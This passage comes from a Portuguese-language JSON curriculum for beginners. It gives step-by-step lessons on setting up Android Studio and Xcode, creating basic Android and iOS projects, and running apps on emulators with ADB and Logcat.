                                    "Nome de AVD com caracteres especiais"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar Gradle e Testar com Projeto Inicial",
                                  "subSteps": [
                                    "Crie novo projeto: New Project > Empty Activity > nome 'TesteConfig'.",
                                    "Configure linguagem (Kotlin/Java), Minimum SDK (API 24+).",
                                    "Abra build.gradle (Module: app) e verifique dependências básicas.",
                                    "Sync Gradle (botão elefante ou File > Sync).",
                                    "Run 'app' no AVD criado (Shift+F10); app deve compilar e rodar."
                                  ],
                                  "verification": "Projeto compila sem erros, instala e executa no emulador mostrando 'Hello World'.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "AVD configurado"
                                  ],
                                  "tips": "Use Gradle Wrapper para consistência; limpe cache se sync falhar (Build > Clean).",
                                  "learningObjective": "Validar configuração completa via ciclo build-run com Gradle.",
                                  "commonMistakes": [
                                    "Não sync após editar build.gradle",
                                    "Minimum SDK incompatível com AVD",
                                    "Ignorar warnings de Gradle"
                                  ]
                                }
                              ],
                              "practicalExample": "Após configuração, crie um app simples de contador de cliques: adicione um Button e TextView no layout, implemente onClick para incrementar contador. Rode no AVD para ver funcionamento em tempo real.",
                              "finalVerifications": [
                                "Android Studio inicia em <10s sem erros de componentes faltantes.",
                                "SDK Manager lista pelo menos 2 API levels instalados.",
                                "AVD boot completo em <2min com aceleração ativada.",
                                "Projeto de teste compila e roda via Gradle sem warnings críticos.",
                                "Gradle sync succeeds em <1min.",
                                "Emulador responde a toques e exibe apps corretamente."
                              ],
                              "assessmentCriteria": [
                                "Todos os steps completados com verificações positivas (100%).",
                                "Tempo total <2h, demonstrando eficiência.",
                                "Sem erros comuns identificados nos steps.",
                                "Projeto teste funcional com código limpo.",
                                "Documentação de caminhos SDK/AVD anotados.",
                                "Explicação oral dos componentes instalados."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Integração com linguagens Java/Kotlin.",
                                "Sistemas Operacionais: Gerenciamento de virtualização e drivers.",
                                "Redes: Downloads e uso de repositórios Gradle/Maven.",
                                "Gestão de Projetos: Versionamento implícito via Gradle.",
                                "Segurança da Informação: Verificação de fontes oficiais."
                              ],
                              "realWorldApplication": "Desenvolvedores usam essa configuração diariamente para criar apps como WhatsApp ou Uber, testando em emuladores antes de deploy em milhões de dispositivos reais, economizando custos com hardware físico."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.3",
                            "name": "Criar um Projeto Básico no Android Studio",
                            "description": "Criar um novo projeto utilizando templates como Empty Activity, configurar o manifesto AndroidManifest.xml e implementar uma Activity simples com layout XML e código Kotlin ou Java.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar um Novo Projeto no Android Studio usando Empty Activity",
                                  "subSteps": [
                                    "Abra o Android Studio e clique em 'New Project'.",
                                    "Selecione o template 'Empty Activity' e clique em 'Next'.",
                                    "Preencha o nome do projeto (ex: 'MeuPrimeiroApp'), package name (ex: 'com.exemplo.app'), selecione Kotlin como linguagem e API mínima (ex: API 24), então clique em 'Finish'.",
                                    "Aguarde o Gradle sincronizar o projeto.",
                                    "Verifique a estrutura de pastas no Project Explorer (app > src > main > java e res)."
                                  ],
                                  "verification": "O projeto aparece no editor com pastas geradas e sem erros de sincronização no log do Gradle.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Android Studio instalado (versão mais recente)",
                                    "Conexão à internet para download de dependências"
                                  ],
                                  "tips": "Sempre use nomes de package em minúsculas e sem caracteres especiais para evitar erros.",
                                  "learningObjective": "Entender o processo de criação de um projeto Android básico e a estrutura inicial gerada.",
                                  "commonMistakes": [
                                    "Selecionar Java em vez de Kotlin se o foco for moderno",
                                    "Escolher API mínima muito alta limitando dispositivos",
                                    "Ignorar a sincronização do Gradle"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o AndroidManifest.xml",
                                  "subSteps": [
                                    "Navegue até app > src > main > AndroidManifest.xml no Project Explorer.",
                                    "Abra o arquivo e examine as tags <application> e <activity>.",
                                    "Adicione uma permissão se necessário (ex: <uses-permission android:name='android.permission.INTERNET'/> dentro de <manifest>).",
                                    "Defina o tema ou ícone da aplicação na tag <application> se desejar personalizar.",
                                    "Salve o arquivo e verifique se não há erros XML no editor."
                                  ],
                                  "verification": "O arquivo AndroidManifest.xml abre sem erros de sintaxe e as activities estão declaradas corretamente.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Android Studio"
                                  ],
                                  "tips": "Use o editor visual do Android Studio para editar o manifesto clicando na aba 'Android' no canto inferior esquerdo.",
                                  "learningObjective": "Aprender a configurar metadados essenciais do app e declarar componentes.",
                                  "commonMistakes": [
                                    "Esquecer de declarar a activity principal",
                                    "Erros de digitação em nomes de permissões",
                                    "Não salvar após edições"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar o Layout XML na Activity Principal",
                                  "subSteps": [
                                    "Abra app > res > layout > activity_main.xml.",
                                    "Mude para a aba 'Code' ou 'Split' e adicione um TextView e um Button dentro de <LinearLayout>.",
                                    "Exemplo: <TextView android:id='@+id/textView' android:text='Olá Mundo' ... /> e <Button android:id='@+id/button' android:text='Clique Aqui' ... />.",
                                    "Defina android:layout_width='match_parent' e height='wrap_content' para ambos.",
                                    "Salve e verifique no preview do layout."
                                  ],
                                  "verification": "O preview do layout mostra o TextView e Button sem erros de renderização.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Android Studio"
                                  ],
                                  "tips": "Use ConstraintLayout para layouts mais complexos, mas LinearLayout é ideal para iniciantes.",
                                  "learningObjective": "Dominar a criação de interfaces simples com XML declarativo.",
                                  "commonMistakes": [
                                    "Omitir android:id único",
                                    "Usar dimensões fixas em vez de match_parent/wrap_content",
                                    "Erros de fechamento de tags XML"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar a Lógica na MainActivity.kt",
                                  "subSteps": [
                                    "Abra app > src > main > java > [seu.package] > MainActivity.kt.",
                                    "No onCreate(), após setContentView(R.layout.activity_main), encontre views: val textView = findViewById<TextView>(R.id.textView).",
                                    "Adicione listener ao button: button.setOnClickListener { textView.text = 'Botão Clicado!' }.",
                                    "Importe as classes necessárias (TextView, Button) se não estiverem auto-importadas.",
                                    "Salve o arquivo."
                                  ],
                                  "verification": "O código Kotlin compila sem erros vermelhos no editor.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Android Studio"
                                  ],
                                  "tips": "Use View Binding ou Kotlin Synthetic para simplificar findViewById em projetos reais.",
                                  "learningObjective": "Conectar layout XML com lógica de programação em Kotlin.",
                                  "commonMistakes": [
                                    "Esquecer importações",
                                    "Usar IDs errados no findViewById",
                                    "Não chamar setOnClickListener corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Build, Executar e Testar o App",
                                  "subSteps": [
                                    "Conecte um emulador ou dispositivo físico (ative USB Debugging).",
                                    "Clique no ícone 'Run' (triângulo verde) ou Shift + F10.",
                                    "Monitore o logcat para erros durante o build e instalação.",
                                    "Teste o app: verifique se inicia, exibe layout e responde ao clique no botão.",
                                    "Pare o app e refaça o run para confirmar reproducibilidade."
                                  ],
                                  "verification": "O app instala e roda no emulador/dispositivo, com funcionalidade do botão alterando o texto.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Emulador Android configurado ou dispositivo físico com ADB"
                                  ],
                                  "tips": "Use AVD Manager para criar emuladores rápidos se não tiver dispositivo.",
                                  "learningObjective": "Testar e depurar um app Android completo.",
                                  "commonMistakes": [
                                    "Emulador sem aceleração de hardware",
                                    "Dispositivo sem modo desenvolvedor ativado",
                                    "Ignorar erros no logcat"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um app 'MeuPrimeiroApp' com um TextView exibindo 'Olá Mundo!' e um Button 'Clique Aqui'. Ao clicar, o texto muda para 'Botão Clicado!'. Rode no emulador Pixel 4 API 30.",
                              "finalVerifications": [
                                "Projeto sincroniza e build sem erros de Gradle.",
                                "AndroidManifest.xml declara MainActivity corretamente.",
                                "Layout activity_main.xml renderiza TextView e Button no preview.",
                                "MainActivity.kt compila e responde a cliques.",
                                "App executa no emulador/dispositivo e funcionalidade funciona.",
                                "Não há crashes ou warnings críticos no logcat."
                              ],
                              "assessmentCriteria": [
                                "Estrutura do projeto segue padrões Android (pastas corretas).",
                                "Configurações no AndroidManifest.xml são precisas e sem erros.",
                                "Layout XML é semântico, responsivo e usa IDs únicos.",
                                "Código Kotlin é limpo, com lógica funcional e imports corretos.",
                                "App roda suavemente com testes de usabilidade completos.",
                                "Tempo total de execução dentro do estimado (45-65 minutos)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Lógica de eventos e manipulação de UI em Kotlin.",
                                "Design de UI/UX: Criação de interfaces intuitivas com XML.",
                                "Gerenciamento de Projetos: Uso de IDE e ferramentas de build (Gradle).",
                                "Computação Móvel: Entendimento de ciclo de vida de apps Android.",
                                "Depuração: Análise de logs e resolução de erros."
                              ],
                              "realWorldApplication": "Essa habilidade é o ponto de partida para desenvolver apps móveis reais, como apps de delivery (ex: iFood), redes sociais (ex: Instagram clones) ou ferramentas de produtividade, permitindo protótipos rápidos para startups e empresas de tecnologia."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.2.1.1.4",
                            "name": "Executar Aplicação em Emulador ou Dispositivo",
                            "description": "Compilar e executar uma aplicação Android em um emulador AVD ou dispositivo físico conectado via USB, utilizando ADB para depuração e monitoramento de logs no Logcat.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Execução",
                                  "subSteps": [
                                    "Verifique se o Android Studio está instalado e o SDK atualizado.",
                                    "Crie ou inicie um AVD (Android Virtual Device) no AVD Manager ou conecte um dispositivo físico via USB com depuração ativada.",
                                    "Habilite o modo desenvolvedor no dispositivo físico (Configurações > Sobre o telefone > Toque 7x no número da compilação).",
                                    "Instale drivers USB necessários para o dispositivo (se aplicável) e autorize a depuração USB.",
                                    "Confirme que o emulador ou dispositivo aparece na lista de dispositivos disponíveis no Android Studio."
                                  ],
                                  "verification": "O emulador inicia sem erros ou o dispositivo é listado como 'disponível' no gerenciador de dispositivos do Android Studio.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "AVD Manager",
                                    "Cabo USB (para dispositivo físico)",
                                    "Drivers USB do fabricante"
                                  ],
                                  "tips": "Sempre feche outros emuladores para evitar conflitos de porta; use 'adb devices' no terminal para listar dispositivos conectados.",
                                  "learningObjective": "Configurar corretamente o ambiente de teste para execução de apps Android.",
                                  "commonMistakes": [
                                    "Esquecer de ativar depuração USB",
                                    "Usar cabo USB sem suporte a dados",
                                    "AVD com pouca RAM causando lentidão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar a Aplicação",
                                  "subSteps": [
                                    "Abra o projeto no Android Studio e sincronize o Gradle (clique em 'Sync Now').",
                                    "Selecione a variante de build (debug/release) no Build Variants panel.",
                                    "Execute 'Build > Make Project' ou use o atalho Ctrl+F9 para compilar.",
                                    "Verifique a aba Build no painel inferior para erros de compilação e corrija se necessário.",
                                    "Gere o APK de debug em app/build/outputs/apk/debug."
                                  ],
                                  "verification": "Compilação bem-sucedida sem erros no log de build, com APK gerado.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "Projeto Android válido"
                                  ],
                                  "tips": "Limpe o projeto (Build > Clean Project) antes de buildar para evitar caches corrompidos.",
                                  "learningObjective": "Entender o processo de build e identificar erros comuns de compilação.",
                                  "commonMistakes": [
                                    "Não sincronizar Gradle após mudanças",
                                    "Selecionar build release sem chave de assinatura",
                                    "Ignorar warnings no build"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e Executar a Aplicação",
                                  "subSteps": [
                                    "Selecione o emulador ou dispositivo na lista de dispositivos de destino.",
                                    "Clique no botão Run (triângulo verde) ou Shift+F10 para instalar e executar.",
                                    "Aguarde a instalação automática via ADB e o lançamento do app.",
                                    "Confirme que o app abre na tela inicial sem crashes.",
                                    "Use 'adb install caminho/do/app.apk' no terminal se preferir linha de comando."
                                  ],
                                  "verification": "O app é instalado e executa corretamente no emulador/dispositivo, visível na tela.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Emulador rodando ou dispositivo conectado",
                                    "APK compilado"
                                  ],
                                  "tips": "Desinstale versões anteriores com 'adb uninstall pacote' para evitar conflitos.",
                                  "learningObjective": "Executar apps de forma automatizada usando ferramentas do Android Studio.",
                                  "commonMistakes": [
                                    "Dispositivo não selecionado corretamente",
                                    "App já instalado com assinatura diferente",
                                    "Porta ADB bloqueada por firewall"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar Logs e Depurar com ADB e Logcat",
                                  "subSteps": [
                                    "Abra o Logcat no Android Studio (View > Tool Windows > Logcat).",
                                    "Selecione o dispositivo e filtre por 'No Filters' ou pelo nome do pacote do app.",
                                    "Execute ações no app e observe logs em tempo real (verbose/debug/info).",
                                    "Use comandos ADB como 'adb logcat' no terminal para monitoramento externo.",
                                    "Identifique erros (ex: NullPointerException) e depure adicionando breakpoints."
                                  ],
                                  "verification": "Logs do app são exibidos no Logcat, incluindo mensagens de debug personalizadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "ADB instalado (parte do SDK)",
                                    "Logcat no Android Studio"
                                  ],
                                  "tips": "Filtre por tag ou level de log para reduzir ruído; salve logs com 'Export to text file'.",
                                  "learningObjective": "Usar ferramentas de depuração para monitorar e resolver problemas em runtime.",
                                  "commonMistakes": [
                                    "Não filtrar logs causando sobrecarga",
                                    "Confundir logs de sistema com app",
                                    "ADB não iniciado (adb kill-server && adb start-server)"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um app 'Hello World' simples no Android Studio. Compile, execute no AVD Pixel 4 API 30, interaja com um botão que gera um Toast, e monitore no Logcat a mensagem 'Botão clicado!' para confirmar.",
                              "finalVerifications": [
                                "App compila sem erros e executa no emulador/dispositivo.",
                                "Instalação via ADB ocorre em menos de 30 segundos.",
                                "Logcat exibe logs de debug do app sem falhas críticas.",
                                "App responde a interações do usuário conforme esperado.",
                                "Dispositivo/emulador pode ser desconectado e reconectado sem perda de funcionalidade.",
                                "Exportação de logs captura eventos completos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração do ambiente (sem erros de conexão).",
                                "Tempo de build e execução dentro do estimado (<1 min).",
                                "Identificação correta de pelo menos 2 erros simulados via Logcat.",
                                "Uso correto de comandos ADB em cenários manuais.",
                                "Relato claro de verificações finais com evidências (screenshots/logs).",
                                "Aplicação de tips para evitar common mistakes."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Integração com linguagens como Kotlin/Java para debugging.",
                                "Redes e Sistemas: Uso de ADB como protocolo cliente-servidor.",
                                "Testes de Software: Práticas de unit/integration testing em runtime.",
                                "Gestão de Projetos: Ciclo de build-deploy-test em DevOps mobile.",
                                "Segurança: Configuração segura de depuração USB."
                              ],
                              "realWorldApplication": "Desenvolvedores usam essa habilidade diariamente para testar apps antes de submissão à Play Store, depurar crashes reportados por usuários e otimizar performance em dispositivos reais variados."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.2",
                        "name": "Plataforma iOS",
                        "description": "Introdução à plataforma iOS, baseada no kernel XNU, com frameworks como UIKit e SwiftUI, e a ferramenta oficial Xcode para desenvolvimento de aplicativos nativos exclusivos para dispositivos Apple.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.2.1",
                            "name": "Compreender a Arquitetura iOS",
                            "description": "Descrever as camadas da arquitetura iOS, incluindo Core OS (XNU kernel), Core Services, Media, Cocoa Touch, destacando o modelo MVC e suporte a linguagens Swift e Objective-C.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Visão Geral da Arquitetura em Camadas do iOS",
                                  "subSteps": [
                                    "Acesse a documentação oficial da Apple sobre a arquitetura iOS em developer.apple.com.",
                                    "Identifique as quatro camadas principais: Core OS, Core Services, Media e Cocoa Touch.",
                                    "Desenhe um diagrama simples representando a hierarquia das camadas, do kernel até a interface do usuário.",
                                    "Explique verbalmente ou por escrito como as camadas se comunicam de baixo para cima.",
                                    "Compare com arquiteturas de outras plataformas, como Android, para contextualizar."
                                  ],
                                  "verification": "Diagrama completo e explicação escrita que lista corretamente as 4 camadas e suas interações.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Apple Developer",
                                    "Ferramenta de diagramação como Draw.io ou papel e caneta"
                                  ],
                                  "tips": "Comece pelo fundo (Core OS) e suba para as camadas superiores para entender o fluxo.",
                                  "learningObjective": "Compreender a estrutura hierárquica da arquitetura iOS.",
                                  "commonMistakes": [
                                    "Confundir camadas (ex: achar que Cocoa Touch é kernel)",
                                    "Ignorar a comunicação entre camadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Camada Core OS (XNU Kernel)",
                                  "subSteps": [
                                    "Estude o XNU kernel: leia sobre seu papel como base do sistema operacional Darwin.",
                                    "Identifique componentes como drivers de hardware, gerenciamento de memória e rede.",
                                    "Pesquise como o XNU suporta multitarefa e segurança (sandboxing).",
                                    "Assista a um vídeo explicativo sobre o kernel iOS (ex: WWDC sessions).",
                                    "Anote 3 funções principais do Core OS em um mapa mental."
                                  ],
                                  "verification": "Mapa mental ou lista com pelo menos 3 funções corretas do Core OS e menção ao XNU.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação Apple sobre Darwin/XNU",
                                    "Vídeos WWDC no YouTube",
                                    "Ferramenta de mind mapping como XMind"
                                  ],
                                  "tips": "Relacione o kernel com conceitos de SO como Linux para facilitar a compreensão.",
                                  "learningObjective": "Dominar os fundamentos da camada base da arquitetura iOS.",
                                  "commonMistakes": [
                                    "Confundir XNU com o kernel completo do macOS",
                                    "Subestimar o papel em segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Core Services, Media e Cocoa Touch",
                                  "subSteps": [
                                    "Liste frameworks da Core Services: Core Foundation, Address Book, etc.",
                                    "Descreva a camada Media: Core Audio, Core Animation, OpenGL ES.",
                                    "Estude Cocoa Touch: UIKit, Foundation, suporte a gestos e eventos touch.",
                                    "Crie uma tabela comparando APIs de cada camada com exemplos de uso.",
                                    "Simule um fluxo de app: como um toque na tela (Cocoa Touch) acessa mídia (Media)."
                                  ],
                                  "verification": "Tabela comparativa com pelo menos 2 frameworks por camada e um fluxo de exemplo.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação UIKit e Core Frameworks",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Use exemplos de apps reais como o Safari para ilustrar cada camada.",
                                  "learningObjective": "Diferenciar e exemplificar as funcionalidades das camadas intermediárias e superiores.",
                                  "commonMistakes": [
                                    "Misturar Media com multimídia web",
                                    "Esquecer Foundation em Cocoa Touch"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compreender o Modelo MVC e Suporte a Swift/Objective-C",
                                  "subSteps": [
                                    "Explique MVC: Model (dados), View (UI), Controller (lógica).",
                                    "Estude como MVC é implementado no UIKit (Cocoa Touch).",
                                    "Compare Swift e Objective-C: sintaxe, performance e interoperabilidade.",
                                    "Crie um pseudocódigo simples de um app MVC em Swift.",
                                    "Pesquise migrações de apps Objective-C para Swift na documentação Apple."
                                  ],
                                  "verification": "Pseudocódigo MVC funcional e explicação de 3 diferenças entre Swift e Objective-C.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação MVC Apple",
                                    "Playground Swift no Xcode (gratuito)"
                                  ],
                                  "tips": "Pense em MVC como separação de responsabilidades para escalabilidade.",
                                  "learningObjective": "Aplicar o padrão MVC e entender o suporte multilíngue da plataforma.",
                                  "commonMistakes": [
                                    "Confundir Controller com View",
                                    "Achar que Swift substituiu completamente Objective-C"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um diagrama interativo no Keynote ou Figma mostrando um app de lista de tarefas: toque na tela (Cocoa Touch) atualiza animação (Media), acessa dados via Core Services e roda no XNU kernel, usando MVC em Swift.",
                              "finalVerifications": [
                                "Desenhar corretamente as 4 camadas da arquitetura iOS.",
                                "Explicar o papel do XNU kernel em gerenciamento de recursos.",
                                "Listar 3 frameworks de Core Services e 2 de Media.",
                                "Descrever o fluxo MVC em um app iOS simples.",
                                "Comparar sintaxe básica Swift vs Objective-C.",
                                "Identificar como as camadas suportam desenvolvimento multiplataforma."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição das camadas (80% correto).",
                                "Profundidade nos subcomponentes (ex: frameworks específicos).",
                                "Clareza no diagrama e fluxos de exemplo.",
                                "Compreensão prática do MVC com pseudocódigo funcional.",
                                "Integração correta de Swift/Objective-C no contexto.",
                                "Ausência de erros comuns sobre kernel ou interações de camadas."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Padrões de design como MVC em outras linguagens.",
                                "Sistemas Operacionais: Comparação com kernels Linux/Android.",
                                "Design de Software: Arquitetura em camadas para escalabilidade.",
                                "Desenvolvimento Web: Paralelos com camadas HTML/CSS/JS."
                              ],
                              "realWorldApplication": "Ao desenvolver apps iOS como um app de delivery, entender a arquitetura permite otimizar performance (usando Core Services para rede), criar UIs responsivas (Cocoa Touch/MVC) e depurar issues de kernel, resultando em apps estáveis na App Store."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.2",
                            "name": "Instalar e Configurar Xcode",
                            "description": "Instalar o Xcode via Mac App Store, configurar simuladores iOS, provisionar certificados Apple Developer e preparar o ambiente para desenvolvimento em macOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar o Xcode via Mac App Store",
                                  "subSteps": [
                                    "Abra o Mac App Store no seu macOS.",
                                    "Pesquise por 'Xcode' na barra de busca.",
                                    "Selecione a versão oficial da Apple (geralmente a mais recente) e clique em 'Obter' ou 'Instalar'.",
                                    "Aguarde o download e instalação (pode levar tempo dependendo da conexão).",
                                    "Execute o Xcode pela primeira vez para instalar componentes adicionais."
                                  ],
                                  "verification": "Verifique se o ícone do Xcode aparece no Launchpad ou Applications e se abre sem erros de instalação.",
                                  "estimatedTime": "30-60 minutos",
                                  "materials": [
                                    "Mac com macOS Ventura ou superior",
                                    "Conexão à internet estável",
                                    "Pelo menos 20GB de espaço livre em disco"
                                  ],
                                  "tips": "Feche outros apps para acelerar o download; use Wi-Fi rápido.",
                                  "learningObjective": "Compreender o processo de instalação de ferramentas de desenvolvimento via loja oficial da Apple.",
                                  "commonMistakes": [
                                    "Instalar versões não oficiais de fontes terceiras",
                                    "Ignorar requisitos de espaço em disco",
                                    "Não executar o Xcode após instalação para completar setup"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar os Simuladores iOS no Xcode",
                                  "subSteps": [
                                    "Abra o Xcode e vá para Preferences (Cmd + ,).",
                                    "Selecione a aba 'Platforms' ou 'Components'.",
                                    "Baixe e instale simuladores para versões iOS desejadas (ex: iOS 17).",
                                    "Reinicie o Xcode se necessário.",
                                    "Teste abrindo Window > Devices and Simulators e verificando a lista."
                                  ],
                                  "verification": "Confirme que pelo menos um simulador iOS aparece na lista e pode ser iniciado.",
                                  "estimatedTime": "15-30 minutos",
                                  "materials": [
                                    "Xcode instalado",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Instale apenas simuladores necessários para economizar espaço.",
                                  "learningObjective": "Aprender a gerenciar e configurar ambientes de teste virtuais para iOS.",
                                  "commonMistakes": [
                                    "Baixar todos os simuladores desnecessariamente",
                                    "Esquecer de reiniciar o Xcode",
                                    "Confundir Platforms com Components"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Conta Apple Developer",
                                  "subSteps": [
                                    "Acesse developer.apple.com/account no navegador.",
                                    "Clique em 'Account' e faça login com Apple ID ou crie um novo.",
                                    "Aceite os termos do Apple Developer Program (gratuito para testes básicos).",
                                    "Complete o perfil com informações de contato.",
                                    "Verifique o email de confirmação."
                                  ],
                                  "verification": "Acesse o portal e veja seu nome no topo como desenvolvedor registrado.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Apple ID válido",
                                    "Navegador web",
                                    "Email acessível"
                                  ],
                                  "tips": "Use um Apple ID dedicado para desenvolvimento.",
                                  "learningObjective": "Entender a importância de uma conta developer para acesso a ferramentas Apple.",
                                  "commonMistakes": [
                                    "Usar Apple ID pessoal sem 2FA",
                                    "Ignorar verificação de email",
                                    "Confundir conta gratuita com paga"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Provisionar Certificados e Perfis de Provisionamento",
                                  "subSteps": [
                                    "No Xcode, vá para Preferences > Accounts e adicione sua Apple ID.",
                                    "No portal developer.apple.com, gere um Certificate de desenvolvimento.",
                                    "Baixe o certificado e importe no Keychain Access do macOS.",
                                    "Crie um App ID e Provisioning Profile no portal.",
                                    "Regenere perfis no Xcode (Manage Certificates)."
                                  ],
                                  "verification": "No Xcode, crie um novo projeto e veja 'Team' selecionável sem erros de signing.",
                                  "estimatedTime": "20-40 minutos",
                                  "materials": [
                                    "Conta Apple Developer",
                                    "Xcode",
                                    "Keychain Access"
                                  ],
                                  "tips": "Ative 2FA no Apple ID; revogue certificados antigos se houver conflitos.",
                                  "learningObjective": "Dominar o processo de signing de apps para testes e distribuição.",
                                  "commonMistakes": [
                                    "Não ativar 2FA",
                                    "Gerar certificados errados (distribuição vs desenvolvimento)",
                                    "Não importar no Keychain"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Preparar o Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Crie um novo projeto iOS no Xcode (File > New > Project).",
                                    "Selecione simulador e execute (Cmd + R).",
                                    "Verifique logs no console para erros.",
                                    "Configure preferências gerais (ex: localização do DerivedData).",
                                    "Teste build e run em dispositivo físico se disponível."
                                  ],
                                  "verification": "App padrão roda no simulador sem crashes ou warnings de signing.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Xcode configurado",
                                    "Simulador iOS"
                                  ],
                                  "tips": "Use Product > Clean Build Folder se houver issues.",
                                  "learningObjective": "Validar todo o ambiente para desenvolvimento produtivo.",
                                  "commonMistakes": [
                                    "Esquecer de selecionar Team no signing",
                                    "Executar sem simulador ativo",
                                    "Ignorar warnings no Issue Navigator"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um novo projeto Single View App no Xcode, selecione iPhone 15 Simulator, configure signing com sua conta Developer, execute e veja a tela branca padrão carregando sem erros, confirmando que o ambiente está pronto para codificar um app real como um gerenciador de tarefas.",
                              "finalVerifications": [
                                "Xcode abre e cria projetos sem erros de instalação.",
                                "Simuladores iOS baixados e executam apps de teste.",
                                "Conta Apple Developer adicionada no Xcode Accounts.",
                                "Certificados e provisioning profiles válidos sem warnings de signing.",
                                "Novo projeto compila e roda no simulador ou dispositivo.",
                                "Console limpo de erros críticos."
                              ],
                              "assessmentCriteria": [
                                "Todos os steps completados sem erros recorrentes.",
                                "Tempo total dentro de 2 horas.",
                                "Capacidade de troubleshooting básico (ex: regenerar certificados).",
                                "Documentação de telas ou logs de verificação.",
                                "Execução bem-sucedida de app de teste no simulador.",
                                "Entendimento verbal dos conceitos de signing e provisioning."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Swift: Base para codificação pós-configuração.",
                                "Segurança da Informação: Certificados digitais e signing de apps.",
                                "Gerenciamento de Projetos: Setup de ambientes de desenvolvimento.",
                                "Redes e Internet: Integração com portais Apple online.",
                                "Design de Interfaces: Testes iniciais em simuladores."
                              ],
                              "realWorldApplication": "Desenvolvedores iOS usam essa configuração diariamente para criar e testar apps como Instagram ou Uber para iPhone, submetendo à App Store após provisioning correto, garantindo conformidade com políticas Apple e testes em múltiplos dispositivos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.3",
                            "name": "Criar um Projeto Básico no Xcode",
                            "description": "Criar um novo projeto iOS utilizando templates como App, configurar storyboard ou SwiftUI, implementar uma ViewController simples e gerenciar dependências via Swift Package Manager.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Abrir o Xcode para Criar Novo Projeto",
                                  "subSteps": [
                                    "Baixe e instale a versão mais recente do Xcode da Mac App Store se não tiver.",
                                    "Abra o Xcode e selecione 'Create a new Xcode project' na tela de boas-vindas.",
                                    "Escolha o template 'App' sob iOS > Application.",
                                    "Defina o Product Name (ex: 'MeuPrimeiroApp'), Bundle Identifier único, linguagem Swift e interface SwiftUI ou Storyboard.",
                                    "Escolha um local para salvar o projeto e clique em 'Create'."
                                  ],
                                  "verification": "Verifique se o projeto abre com a estrutura de pastas visível no Navigator, incluindo arquivos como ContentView.swift ou Main.storyboard.",
                                  "estimatedTime": "10-15 minutos",
